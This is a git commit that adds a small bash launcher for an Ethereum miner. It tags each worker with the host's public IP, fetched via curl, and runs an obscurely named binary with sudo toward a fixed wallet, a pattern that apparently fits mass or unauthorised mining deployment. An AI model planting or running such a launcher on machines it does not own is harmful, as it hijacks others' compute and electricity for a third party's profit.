0e290148be47a780ce308cde0182628dfa8f5ac1
maune <89106097+maune@users.noreply.github.com>
2021-08-25 18:52:21 +0800

    Add files via upload

---
+++ cuongdeptrai.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+POOL=us1.ethermine.org:4444
+WALLET=0xdc817b14a85a32f742ba1e7c6bb20e09b8b85f1c.$(echo "$(curl -s ifconfig.me)" | tr . _ )-cuong-dep-trai
+
+cd "$(dirname "$0")"
+
+chmod +x ./cuongCon && sudo ./cuongCon --algo ETHASH --pool $POOL --user $WALLET  $@
